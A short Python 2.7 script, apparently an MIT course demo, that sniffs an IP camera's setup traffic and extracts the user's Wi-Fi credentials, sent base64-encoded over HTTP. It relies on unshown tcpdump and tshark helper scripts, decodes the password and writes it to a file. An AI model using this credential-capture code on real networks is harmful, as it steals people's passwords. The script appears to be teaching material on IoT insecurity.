# Clark Wood -- MIT 6.S978, Spring 2016
# Usage: sudo python2.7 pre_demo.py
# 0) Turn on cam and factory reset, get on network, show http://10.255.255.1/image/jpeg.cgi has password
# 1) Turn on program
# 2) Connect smart phone to cam's network, password is: 578d6f48
# 3) Go through prompts until creds sent through
# 4) Decrypt and pull HTTP with tshark, parse password
# 5) Write to ./passwd.txt
import base64, os, requests, signal, subprocess, time

tcpdump_cmd = ['./monitor_tcpdump.sh']
pro = subprocess.Popen(tcpdump_cmd, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

# Keep listening until we're pretty confident we saw the password
while raw_input('stop listening? [y/n]\n') != 'y':
    time.sleep(10) 
os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

# Parse HTTP from PCAP
p = subprocess.Popen(['./tshark.sh'], stdout=subprocess.PIPE)
stdout, stderr = p.communicate()

# Get creds from HTTP traffic
try:
    coded_password = stdout.partition('password=')[2].split()[0] + '='
except IndexError:
    print "Didn't see password. Networking is hard :("
    sys.exit(0)
password = base64.b64decode(coded_password)
print 'Is this your password: {}?'.format(password)
with open('./passwd.txt', 'w') as write_file:
    write_file.write(password)

